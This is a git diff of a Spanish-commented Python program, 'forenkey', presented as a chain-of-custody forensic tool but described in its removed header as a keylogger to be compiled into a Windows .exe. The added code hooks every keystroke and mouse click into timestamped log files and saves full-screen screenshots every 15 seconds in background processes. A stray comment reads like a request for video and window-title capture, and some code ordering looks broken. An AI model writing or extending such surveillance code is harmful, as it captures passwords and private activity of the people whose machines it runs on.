@@ -1,16 +1,4 @@
 
-"# forenkey" 
-# genera codigo para un keylogger en python
-# para ejecutarlo en windows
-# se debe convertir a .exe
-# con pyinstaller
-# pyinstaller --onefile forenkey.py
-
-#Use pyWinhook instead of pyHook
-#pyHook is not supported in Python 3.x
-#pyWinhook is supported in Python 3.x
-#pyWinhook is a fork of pyHook
-
 import pyWinhook, pythoncom, sys, logging
 import os
 import pyautogui
@@ -21,15 +9,55 @@ import os
 import pyautogui
 import moviepy.editor
 import hashlib
-
+import socket
+import datetime
+import time
 # Importar el módulo tkinter
 import tkinter as tk
 from tkinter import messagebox
+from multiprocessing import Process
 
 # Crear la ventana principal
 window = tk.Tk()
 window.title("Cadena de custodia")
 window.geometry("600x500")
+
+
+# nombre de fichero log + DDMMAAHHMMSS.txt
+logname= 'log'+ pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + '.txt'
+print(logname)
+
+#crea una carpeta capturasdepantalla en la carpeta del usuario
+def createFolder():
+    try:
+        os.mkdir('C:\\users\\%s\\capturasdepantalla' % os.getlogin())
+    except OSError:
+        print ("Creation of the directory %s failed" % 'C:\\users\\%s\\capturasdepantalla' % os.getlogin())
+    else:
+        print ("Successfully created the directory %s " % 'C:\\users\\%s\\capturasdepantalla' % os.getlogin())
+
+
+
+createFolder()
+
+
+#file_log = 'C:\\users\\%s\\logname.txt' % os.getlogin()
+def OnKeyboardEvent(event):
+    
+    logging.basicConfig(filename=f'{logname}', level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
+
+
+def OnMouseEvent(event):
+    #print('Click en ({}, {})'.format(event.Position[0], event.Position[1]))
+    current_time = datetime.datetime.now()
+    logging.basicConfig(filename=f'{logname}', level=logging.DEBUG, format='%(message)s')
+    log_message = f"Click en ({event.Position[0]}, {event.Position[1]}) en {current_time}"
+    logging.log(10,log_message)
+    
+    return True
 
 def keyandmouseLogger():
     # crea un hook manager    
@@ -39,18 +67,50 @@ def keyandmouseLogger():
     hooks_manager.HookKeyboard()
     hooks_manager.HookMouse()
     pythoncom.PumpMessages()
+    print("captura de raton y teclado  iniciado")
     return True
+
+
+def screenshotdateAndTime():
+    i = 0
+    print("La captura de pantalla ha iniciado")
+    while True:
+        screenshot = pyautogui.screenshot()
+        screenshot.save('C:\\users\\%s\\%s_%s.png' % (os.getlogin(), socket.gethostname(), datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))
+        i += 1
+        time.sleep(15)
 
 # Crear una función para iniciar la aplicación
 def start():
+    global p1, p2
     print("La aplicación ha iniciado")
-    keyandmouseLogger()
+    #keyandmouseLogger()
+    
+    p1 = Process(target=keyandmouseLogger)
+    p2 = Process(target=screenshotdateAndTime)
+
+    try:
+        p1.start()
+        print("Iniciando proceso 1")
+        p2.start()
+        print("Iniciando proceso 2")
+    except Exception as e:
+        print("Error iniciando procesos:", e)
 
 # Crear una función para terminar la aplicación
 def stop():
+    global p1,p2
     if messagebox.askyesno("Terminar", "¿Seguro que quieres salir?"):
         showHash()
         print("La aplicación ha terminado")
+        # termina proceso de captura de teclado y mouse
+        p1.terminate()
+        p1.join()
+        p1 = None
+        #Termina proceso de captura de capturas de pantalla
+        p2.terminate()
+        p2.join()
+        p2 = None
         # esperar a que se cierre el popup de showHash antes de cerrar la ventana
         window.after(6000, window.destroy)
        # window.destroy()
@@ -87,33 +147,8 @@ def showHash():
     exit_button.pack(side="bottom")
     #popup.after(5000, popup.destroy)
 
-#popup = tk.Toplevel(window) yes
-#popup.geometry("400x200+200+200") yes
-#hash_text = tk.Text(popup) yes
-#hash_text.pack(side="bottom") yes
-#hash_text.insert(tk.END, "El hash de la carpeta comprimida es: " + hashcalculado)
-# Iniciar el bucle principal de la ventana
 window.mainloop()
 
-
-# ubica el archivo log.txt en la carpeta de este usuario
-
-
-#ubica el archivo log.txt en la carpeta raiz del disco C
-#file_log = 'C:\\log.txt'
-file_log = 'C:\\users\\%s\\logkeyandMouse.txt' % os.getlogin()
-def OnKeyboardEvent(event):
-    
-    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-    chr(event.Ascii)
-    logging.log(10,chr(event.Ascii))
-    return True
-
-
-
-def OnMouseEvent(event):
-    print('Click en ({}, {})'.format(event.Position[0], event.Position[1]))
-    return True
 
 # Añade una func que guarde capturas de pantallas cada 30 segundos durante 10 minutos y guardelas en la carpeta del usuario con el nombre en formato AAAA-MM-DD-HH-MM-SS.png, tambien debe almacenar cada minuto durante 10 minutos el nombre de la ventana activa en el mismo archivo log.txt y un video de 15 segundos de lo que se esta haciendo en el computador en el mismo directorio con el nombre en formato AAAA-MM-DD-HH-MM-SS.mp4, para capturar el video usa la libreria moviepy 1.0.3 y para capturar la ventana activa usa la libreria pygetwindow 0.0.9
 
@@ -129,20 +164,6 @@ def OnMouseEvent(event):
 
 
     
-
-def screenshotVideodateAndTime():
-    screenshot = pyautogui.screenshot()
-    filename = os.path.join('C:\\users', os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + '.png')
-    screenshot.save(filename)
-    clip = moviepy.editor.ImageSequenceClip([filename] * 300, fps=30)
-    auxvideofile = pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + '.mp4'
-    clip.write_videofile(os.path.join('C:\\users', os.getlogin(), auxvideofile ))
-    #llama a una funcion que comrima el vodeo que acabas de guardar
-    compressVideo(os.path.join('C:\\users', os.getlogin(), auxvideofile))
-    hashVideo(auxvideofile)
-
-
-    return True
 
 
 # genera una funcion que genere un hash sha512 de un archivo de video que reciba como parametro y lo guarde en el archivo log.txt
@@ -178,7 +199,7 @@ def screenshotandvideo():
 
     return True
 
-def hashVideo(filename):
+def hashCarpeta(filename):
     filename = os.path.join('C:\\users', os.getlogin(), filename)
     with open(filename, 'rb') as f:
         bytes = f.read()
@@ -187,10 +208,6 @@ def hashVideo(filename):
         
     return True
 
-def screenshotdateAndTime():
-    screenshot = pyautogui.screenshot()
-    screenshot.save('C:\\users\\%s\\%s.png' % (os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))
-    return True
 
 now = pyautogui.datetime.datetime.now()
 # 10 minutos = 600 segundos
